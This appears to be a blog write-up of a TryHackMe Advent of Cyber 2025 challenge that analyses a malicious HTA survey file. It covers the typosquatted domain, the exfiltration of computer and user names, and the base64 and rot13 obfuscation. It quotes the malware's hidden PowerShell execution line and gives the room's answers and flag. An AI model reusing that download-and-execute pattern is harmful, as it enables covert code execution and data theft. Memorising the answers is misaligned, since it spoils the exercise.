---
id: 21
title: Advent of Cyber 2025: Day 21
date: 2025-12-21
category: CTF
difficulty: Easy
readTime: 15 min
---

## Introduction 
Today's Box is about :
- Application metadata
- Script functions
- Any network calls or encoded data
- Clues about exfiltration

## Walkthrough
Well i have interpret the data in the given `hta` file 

Title of the HTA application ?
>**Best Festival Company Developer Survey**

What VBScript function is acting as if it is downloading the survey questions?
>**getQuestions**

What URL domain (including sub-domain) is the "questions" being downloaded from?
>**survey.bestfestiivalcompany.com**

Malhare seems to be using typosquatting, domains that look the same as the real one, in an attempt to hide the fact that the domain is not the inteded one, what character in the domain gives this away?
>**i**

Malicious HTAs often include real-looking data, like survey questions, to make the file seem authentic. How many questions does the survey have?
>**4**

Notice how even in code, social engineering persists, fake incentives like contests or trips hide in plain sight to build trust. The survey entices participation by promising a chance to win a trip to where?
>**South Pole**

The HTA is enumerating information from the local host executing the application. What two pieces of information about the computer it is running on are being exfiltrated? You should provide the two object names separated by commas.
>**ComputerName,UserName**

What endpoint is the enumerated data being exfiltrated to?
>**/details**

What HTTP method is being used to exfiltrate the data?
>**GET**

After reviewing the function intended to get the survey questions, it seems that the data from the download of the questions is actually being executed. What is the line of code that executes the contents of the download?
>**runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False**

It seems as if the malware site has been taken down, so we cannot download the contents that the malware was executing. Fortunately, one of the elves created a copy when the site was still active. Download the contents from [here](https://assets.tryhackme.com/additional/aoc2025/files/blob.txt). What popular encoding scheme was used in an attempt to obfuscate the download?
>**base64**

Decode the payload. It seems as if additional steps where taken to hide the malware! What common encryption scheme was used in the script?
>**rot13**

Either run the script or decrypt the flag value using online tools such as CyberChef. What is the flag value?
>**THM{Malware.Analysed}**
